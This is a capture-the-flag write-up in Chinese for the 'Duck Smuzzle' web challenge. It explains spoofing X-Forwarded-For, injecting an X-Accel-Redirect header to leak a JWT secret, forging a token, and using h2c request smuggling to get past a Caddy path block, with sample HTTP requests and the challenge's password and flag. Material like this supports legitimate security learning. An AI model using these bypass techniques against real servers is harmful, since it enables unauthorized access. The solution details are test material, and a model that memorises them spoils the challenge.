# Duck Smuzzle

## 題目描述

Muzzle Smuzzle

*This challenge is solvable and contains a zero-day vulnerability. It’s not impossible to solve; you just need to find a way to bypass the WAF.

`curl http://duck-smuzzle.v1t.site/goose`

## 解題思路

看程式碼，我們去 `/goose` 會先拿到一個 cookie，之後我們要把 cookie 的 role 改成 `duck`，並且要密碼正確才能拿到 flag

看到 `/duck` 的函式叫做 `REDACTED` 就知道它的函式名稱就是密碼

```py
@app.get("/duck")
async def REDACTED(
    password: str,
    sid: str | None = Cookie(default=None),
):
    role = get_role_from_jwt(sid)

    if password == "REDACTED" and role == "duck":
        return FLAG

    return "quack"
```

於是去 `/openapi.json`，因為會被擋，所以要加 `X-Forwarded-For: 67.67.67.67` 的 header，並且要去 `:81` 有 nginx

```json
{
    "openapi": "3.1.0",
    "info": {
        "title": "FastAPI",
        "version": "0.1.0"
    },
    "paths": {
        "/duck": {
            "get": {
                "summary": "D8Xao6H7Encgx5V4Fwhsbvgztypnebkq",
                "operationId": "d8XAO6H7enCGx5V4fWhsBvgztyPNEbKq_duck_get",
                "parameters": [
                    {
                        "name": "password",
                        "in": "query",
                        "required": true,
                        "schema": {
                            "type": "string",
                            "title": "Password"
                        }
                    },
                    {
                        "name": "sid",
                        "in": "cookie",
                        "required": false,
                        "schema": {
                            "anyOf": [
                                {
                                    "type": "string"
                                },
                                {
                                    "type": "null"
                                }
                            ],
                            "title": "Sid"
                        }
                    }
                ],
                "responses": {
                    "200": {
                        "description": "Successful Response",
                        "content": {
                            "application/json": {
                                "schema": {}
                            }
                        }
                    },
                    "422": {
                        "description": "Validation Error",
                        "content": {
                            "application/json": {
                                "schema": {
                                    "$ref": "#/components/schemas/HTTPValidationError"
                                }
                            }
                        }
                    }
                }
            }
        },
        ...
    },
    ...
}
```

其中 `operationId` 那串前面的就是密碼 `D8Xao6H7Encgx5V4Fwhsbvgztypnebkq`，接下來我們要拿 JWT 的 secret

可以注意到 `/flag`，他會讀取使用者的輸入然後把他變成 header，然後又因為 nginx 他有一個 `/private` 路徑會得到 jwt secret，所以就把 x 填 `X-Accel-Redirect`，y 填 `/private`，password 填剛剛得到的密碼，就可以得到 jwt secret 了

```py
@app.get("/flag")
async def flag(
    response: Response,
    x: str,
    y: str,
    password: str | None = None,
):
    if password == "REDACTED":
        response.headers[x] = y
    return hashlib.sha256(FLAG.encode()).hexdigest()
```

最後是要訪問 `/duck` 來得到 flag，然而這樣會被 caddy 和 nginx 擋掉，於是就來到本題的重點了，我是走 `:80`，所以要繞過 caddy

題目的名稱有 `Smuzzle`，所以不難想到他是跟 `smuggle` 有關，然後又因為他有裝 hypercorn，這個東西支援 h2c，所以推測是 `h2c smuggling`

流程是 client 先送一個 HTTP/1.1 request，header 帶上 Upgrade: h2c，之後server 回 101 Switching Protocols，然後同一條 TCP connection 變成 HTTP/2，而 client 可以在 HTTP/2 裡開新的 stream。至於 Caddy 擋 /duck 則是針對一開始的 HTTP/1.1 request 做，所以我們就不會被擋了

所以就寫了一個 python 腳本來取得 flag，先去 `/flag`，因為不是 `duck` 所以不會被 Caddy 的 /duck* 規則擋掉

```text
GET /flag?x=a&y=b&password=<password> HTTP/1.1
Host: duck-smuzzle.v1t.site
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: ...
```

升級成功後，在同一條 h2c connection 裡送新的 HTTP/2 stream：

```text
GET /duck?password=<password>
cookie: sid=<forged duck jwt>
x-forwarded-for: 67.67.67.67
```

這樣 /duck 就會直接被送到 backend，繞過 Caddy 在 HTTP/1.1 層做的 /duck* block，然後就可以得到 flag 了

## Flag

```text
v1t{wh0_smuggl3_my_403}
```
